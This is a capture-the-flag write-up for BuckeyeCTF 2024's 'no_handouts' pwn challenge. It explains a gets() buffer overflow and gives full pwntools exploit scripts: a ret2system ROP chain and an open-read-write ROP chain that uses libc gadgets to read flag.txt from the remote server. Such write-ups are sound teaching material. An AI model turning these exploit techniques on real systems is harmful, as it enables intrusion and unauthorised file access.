# no_handouts [70 solves]
### Challenge Description
> I just found a way to kill ROP. I think. Maybe?

`nc challs.pwnoh.io 13371`
### Challenge Author 
> Author: corgo
# Challenge Files 
this time we are not given the source file, only the binary and the binary dependencies.

# Solution
## Analysis 
as usual, we'll first run the `file` and `checksec` command to analyse what type of binary we are dealing with. 
```bash 
fooker@fooker:~/buckeyectf2024/pwn/no_handouts/program$ file chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, BuildID[sha1]=8bb064f6b89f98ac2bf080679b53a76c1f391af6, for GNU/Linux 3.2.0, not stripped
fooker@fooker:~/buckeyectf2024/pwn/no_handouts/program$ checksec chall
[*] '~/buckeyectf2024/pwn/no_handouts/program/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
fooker@fooker:~/buckeyectf2024/pwn/no_handouts/program$
```
even though running the `ldd` command displayed that the binary was using the provided `libc` and `ld`, despite that i decided to run `pwninit` to patch the binary.
```bash
fooker@fooker:~/buckeyectf2024/pwn/no_handouts/program$ ldd chall
        linux-vdso.so.1 (0x00007ffc3ed84000)
        libc.so.6 => ./libc.so.6 (0x00007f8f003b8000)
        ./ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f8f005e8000)
fooker@fooker:~/buckeyectf2024/pwn/no_handouts/program$
```
since we do not have the source file, let's take a look at the decompilation of the binary. 

```c
void setup()
{
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
}

__int64 vuln()
{
  char v1[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("system() only works if there's a shell in the first place!");
  printf("Don't believe me? Try it yourself: it's at %p\n", &system);
  puts("Surely that's not enough information to do anything else.");
  gets(v1);
  return 0LL;
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  setup();
  vuln();
  return 0;
}

```
surprisingly the decompiled code is small in size. the vulnerability is apparent. the procedure `vuln()` uses `gets()` to read into the buffer `v1` allowing us to overflow the buffer. the binary does not have a stack canary protection either, so we are free to craft a ROP chain. despite the `PIE` mitigation, we are provided with a libc leak and therefore, we could directly perform a `ret2system` with all the given information.

## ret2system did not work!
i had a script that worked on my local machine, but it resulted in an error on the remote machine. this was the exploit that i was using
```py
from pwn import *

exe = './chall_patched'
libc_path = 'libc.so.6'
ld_path = 'ld-linux-x86-64.so.2'
elf = context.binary = ELF(exe, checksec=True)
libc = ELF(libc_path, checksec=True)
ld = ELF(ld_path, checksec=True)

host = 'challs.pwnoh.io'
port = 13371

context.terminal = ['tmux', 'splitw', '-h']

## r = process(exe, level='DEBUG')
## r = remote(host, port, level='DEBUG')

gs = '''
break *vuln
continue
'''
r = gdb.debug(exe, gdbscript=gs)

r.recvuntil(b"Try it yourself: it's at")
system_leak = int(r.recvline().strip().decode(), 16)

libc.address = system_leak - libc.symbols['system']

bin_sh = next(libc.search(b"/bin/sh"))
pop_rdi = libc.address + 0x02a3e5
ret = libc.address + 0x1bc065

payload = b'A' * (0x28) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_leak)
r.sendline(payload)

r.interactive()
```
i had no clue what happened. when i switched the target function from `system()` to `puts()`, surprisingly it worked. that's when we realised what was happening. there was no `/bin/sh` on the remote. so we decided to switch to writing a ROP chain that performs an open read write on a file. 

## ORW on a file
all the required gadgets one would need could be easily looked up in the libc and since we already have the libc leak there's no obstacle here. 
i looked up a syscall table online and `x86_64 calling convention` to craft a ROP chain that performs an ORW on a file. 

here's the payload that i used
```py
## exploit payload
payload = b'A' * 0x28

## write 'flag.txt' in libc data section
payload += p64(pop_rdi_ret)
payload += p64(target_address)
payload += p64(libc.sym['gets'])

## open 'flag.txt'
payload += p64(pop_rdi_ret)
payload += p64(target_address)
payload += p64(pop_rsi_ret)
payload += p64(0)
payload += p64(pop_rdx_rbx_ret)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rax_ret)
payload += p64(2)
payload += p64(syscall)

## read './flag.txt'
payload += p64(pop_rdi_ret)
payload += p64(3)
payload += p64(pop_rsi_ret)
payload += p64(target_address)
payload += p64(pop_rdx_rbx_ret)
payload += p64(0xff)
payload += p64(0)
payload += p64(pop_rax_ret)
payload += p64(0)
payload += p64(syscall)

## write './flag.txt'
payload += p64(pop_rdi_ret)
payload += p64(1)
payload += p64(pop_rsi_ret)
payload += p64(target_address)
payload += p64(pop_rdx_rbx_ret)
payload += p64(0xff)
payload += p64(0)
payload += p64(pop_rax_ret)
payload += p64(1)
payload += p64(syscall)

r.sendline(payload)
r.sendline(b'flag.txt\x00')
```

the plan was to `open("./flag.txt")` and then read in that file somewhere into the binary. since we only have a libc leak, i decided to target the `libc data section`. the corresponding page was marked `writeable` (thanks to `Partial RELRO` on the libc binary) so i decided to proceed with this. then we just need to perform a write to `stdout` from the target location. 

i also needed to write in `flag.txt` somewhere in the binary so that i could use that location and pass that in as a parameter in `open()`. i decided to still use the `libc data section` and exploit `gets()` to write data directly from `stdin` directly into the target location. 

## Full Exploit
here's the full exploit that i used. all the ROP gadgets are picked from the provided libc. 

```py
from pwn import *

exe = './chall_patched'
libc_path = 'libc.so.6'
ld_path = 'ld-linux-x86-64.so.2'
elf = context.binary = ELF(exe, checksec=True)
libc = ELF(libc_path, checksec=False)
ld = ELF(ld_path, checksec=False)

host = 'challs.pwnoh.io'
port = 13371

context.terminal = ['tmux', 'splitw', '-h']

## r = process(exe, level='DEBUG')

r = remote(host, port)

gs = '''
break *vuln
continue
'''
## r = gdb.debug(exe, gdbscript=gs)

r.recvuntil(b"Try it yourself: it's at")
system_leak = int(r.recvline().strip().decode(), 16)

libc.address = system_leak - libc.sym['system']

print(hex(libc.address))

bin_sh = next(libc.search(b'/bin/sh'))
pop_rax_ret = libc.address + 0x045eb0
pop_rdi_ret = libc.address + 0x02a3e5
pop_rsi_ret = libc.address + 0x02be51
pop_rdx_rbx_ret = libc.address + 0x0904a9
syscall = libc.address + 0x091316
ret = libc.address + 0x1bc065

target_address = 0x7ffff7fadf00 - 0x7ffff7d92000 + libc.address

## exploit payload
payload = b'A' * 0x28

## write 'flag.txt' in libc data section
payload += p64(pop_rdi_ret)
payload += p64(target_address)
payload += p64(libc.sym['gets'])

## open 'flag.txt'
payload += p64(pop_rdi_ret)
payload += p64(target_address)
payload += p64(pop_rsi_ret)
payload += p64(0)
payload += p64(pop_rdx_rbx_ret)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rax_ret)
payload += p64(2)
payload += p64(syscall)

## read './flag.txt'
payload += p64(pop_rdi_ret)
payload += p64(3)
payload += p64(pop_rsi_ret)
payload += p64(target_address)
payload += p64(pop_rdx_rbx_ret)
payload += p64(0xff)
payload += p64(0)
payload += p64(pop_rax_ret)
payload += p64(0)
payload += p64(syscall)

## write './flag.txt'
payload += p64(pop_rdi_ret)
payload += p64(1)
payload += p64(pop_rsi_ret)
payload += p64(target_address)
payload += p64(pop_rdx_rbx_ret)
payload += p64(0xff)
payload += p64(0)
payload += p64(pop_rax_ret)
payload += p64(1)
payload += p64(syscall)

r.sendline(payload)
r.sendline(b'flag.txt\x00')

r.interactive()
```
when we execute this python script, we have the flag printed to `stdout`
```bash
fooker@fooker:~/buckeyectf2024/pwn/no_handouts/program$ python3 exploit.py
[*] '~/buckeyectf2024/pwn/no_handouts/program/chall_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
[+] Opening connection to challs.pwnoh.io on port 13371: Done
0x7f220406b000
[*] Switching to interactive mode
Surely that's not enough information to do anything else.
bctf{sh3lls_ar3_bl0at_ju5t_use_sh3llcode!}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
$
```
## Flag
`bctf{sh3lls_ar3_bl0at_ju5t_use_sh3llcode!}`